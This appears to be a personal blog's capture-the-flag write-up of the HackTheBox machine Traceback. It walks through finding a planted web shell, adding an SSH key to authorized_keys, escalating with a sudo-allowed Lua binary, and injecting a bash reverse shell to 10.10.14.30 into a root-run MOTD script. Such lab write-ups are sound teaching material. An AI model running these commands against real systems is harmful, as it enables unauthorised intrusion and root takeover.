---
title: "HackTheBox: Traceback Writeup"
date: 2020-08-15 07:00:00 +0000
categories:
  - blog
tags:
  - CTF
  - HTB
  - English
---

Today i'll post a writeup on the machine Traceback from HackTheBox, it's a Linux box with difficulty rating easy. 

The scenario here is that we are left with a box that has been previously hacked, to own the box we craft a specific wordlist, abuse sudo rights and finally exploiting a cronjob running as root. 

![Traceback infocard](https://jackhack.se/assets/images/traceback/traceback_info.png)
{: .full}
# Recon
~~~
# Nmap 7.80 scan initiated Mon Jun  1 15:59:06 2020 as: nmap -sC -sV -oA initial -T 5 10.10.10.181
Nmap scan report for 10.10.10.181
Host is up (0.043s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 96:25:51:8e:6c:83:07:48:ce:11:4b:1f:e5:6d:8a:28 (RSA)
|   256 54:bd:46:71:14:bd:b2:42:a1:b6:b0:2d:94:14:3b:0d (ECDSA)
|_  256 4d:c3:f8:52:b8:85:ec:9c:3e:4d:57:2c:4a:82:fd:86 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Help us
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Jun  1 15:59:21 2020 -- 1 IP address (1 host up) scanned in 15.74 seconds
~~~
{: .language-bash}
Basic nmap scan shows nothing but a webserver and open ssh-port. 
Moving on to manually inspecting the site i am presented with a defaced site telling me there is a backdoor left on the server for anyone to use.

![Website](https://jackhack.se/assets/images/traceback/website.png)
{: .full}
I'm guessing there is some type of commonly used web-shell that has been uploaded, so im heading to google to search for common web-shells, i found two GitHub [repos](https://github.com/TheBinitGhimire/Web-Shells) containing various webshells and put them into a list to use for bruteforcing. 

Now by running gobuster against the url i should be able to find the backdoor that has been left for us. 

~~~
kali@kali:~/boxes/traceback$ gobuster dir -u http://traceback.htb/ -w shells.txt 
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://traceback.htb/
[+] Threads:        10
[+] Wordlist:       shells.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/08/12 04:29:14 Starting gobuster
===============================================================
/smevk.php (Status: 200)
===============================================================
2020/08/12 04:29:15 Finished
===============================================================
~~~
{: .language-bash}

# User
After navigating to the location of **smevk.php** i am met with a login page, checking the previously github repo gives away the default credentials for this particular shell. 

![shell_pass.png](https://jackhack.se/assets/images/traceback/shell_pass.png)
{: .full}
The shell is running as user **webadmin**, so i navigated trough the shell to the users *.ssh* folder and added my ssh-key to the *authorized_keys* file, to be able to get a better shell at the machine. 

![Add SSH Key](https://jackhack.se/assets/images/traceback/addSsh.png)
{: .full}

![Initial shell](https://jackhack.se/assets/images/traceback/shell.png)
{: .full}

After connecting to the machine via ssh and noticing there is no user flag i can see there is a *note.txt* that contains some information from the **sysadmin** account

~~~
webadmin@traceback:~$ ls
note.txt
webadmin@traceback:~$ cat note.txt 
- sysadmin -
I have left a tool to practice Lua.
I'm sure you know where to find it.
Contact me if you have any question.
~~~
{: .language-bash}

One simple privilege escalation technique is to always check if your current user has any sudo permissions, and if so what you are allowed to do

~~~
webadmin@traceback:~$ sudo -l
Matching Defaults entries for webadmin on traceback:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User webadmin may run the following commands on traceback:
    (sysadmin) NOPASSWD: /home/sysadmin/luvit
~~~
{: .language-bash}

This output tells me i can run the binary *luvit* as the user **sysadmin** without providing any password. 

Considering the note mentioning the script language lua i suspect that the binary has something to do with lua. From the [luvit blog](https://luvit.io/blog/pure-luv.html) we can read the following

>Luvit is a single binary that contains the lua vm, libuv, openssl, miniz as well as a host of standard libraries implemented in lua that closely resemble the public node.js APIs. You give it a lua script to run and it runs it in the context of this system.

I don't really have any knowledge about lua, but i tried to make a lua script that would get me a shell as **sysadmin** and then "feed it" to the luvit binary. 

~~~
webadmin@traceback:~$ echo 'os.execute("/bin/bash");' > exploit.lua
webadmin@traceback:~$ sudo -u sysadmin /home/sysadmin/luvit exploit.lua 
sysadmin@traceback:~$ cd /home/sysadmin/
sysadmin@traceback:/home/sysadmin$ cat user.txt
985618----------f3cbb719dfe06e35
sysadmin@traceback:/home/sysadmin$ 
~~~
{: .language-bash}

# Root

Moving on to root, it took me a while and i ran various privesc scripts, but after checking running processes with **ps aux** a few times, i noticed a cronjob running in root context

~~~
--snip--
root       2556  0.0  0.0  58792  3312 ?        S    02:09   0:00 /usr/sbin/CRON -f
root       2559  0.0  0.0   4628   864 ?        Ss   02:09   0:00 /bin/sh -c sleep 30 ; /bin/cp /var/backups/.update-motd.d/* /etc/update-motd.d/
root       2561  0.0  0.0   7468   740 ?        S    02:09   0:00 sleep 30
root       2616  0.0  0.0      0     0 ?        I    02:09   0:00 [kworker/0:0]
sysadmin   2617  0.0  0.0  39664  3684 pts/0    R+   02:09   0:00 ps aux
~~~
{: .language-bash}

So every couple of minutes a cronjob is executed, that copies backuped *motd* files into the */etc/update-motd.d/* folder.

MOTD stands for Message Of The Day, and usally it is the message that's presented to the users while logging on to a system trough a terminal. 

So if i can modify one of the current motd files in the */etc* directory to run some type of reverse shell and execute it before the backup cronjob runs, i should be able to get a shell as root.

This is doable since the files in */etc/update-motd.d/* is owned by the group sysadmin, wich my current user is a member of. 

~~~
sysadmin@traceback:/etc/update-motd.d$ ls -la
total 32
drwxr-xr-x  2 root sysadmin 4096 Aug 27  2019 .
drwxr-xr-x 80 root root     4096 Mar 16 03:55 ..
-rwxrwxr-x  1 root sysadmin  981 Aug 12 02:08 00-header
-rwxrwxr-x  1 root sysadmin  982 Aug 12 02:08 10-help-text
-rwxrwxr-x  1 root sysadmin 4264 Aug 12 02:08 50-motd-news
-rwxrwxr-x  1 root sysadmin  604 Aug 12 02:08 80-esm
-rwxrwxr-x  1 root sysadmin  299 Aug 12 02:08 91-release-upgrade
sysadmin@traceback:/etc/update-motd.d$ 
~~~
{: .language-bash}

So i add my public ssh key to **sysadmin**'s .ssh folder, and insert a simple bash reverse shell into on of these files, set up a reverse shell *listener* and ssh into the box as sysadmin to execute the shell. 

~~~
sysadmin@traceback:/home/sysadmin$ echo "<My public ssh key>" > .ssh/authorized_keys
sysadmin@traceback:/home/sysadmin$ cd /etc/update-motd.d/
sysadmin@traceback:/etc/update-motd.d$ echo -e "'#!/bin/bash\nbash -i >& /dev/tcp/10.10.14.30/9001 0>&1' > 00-header"
~~~
{: .language-bash}

And set up the reverse listener on my kali box
~~~
kali@kali:~$ nc -lvnp 9001

listening on [any] 9001 ...
~~~
{: .language-bash}

After successfully connecting to the box as **sysadmin** my reverse shell executed and i got root on this box.

![Root](https://jackhack.se/assets/images/traceback/root.png)
{: .full}

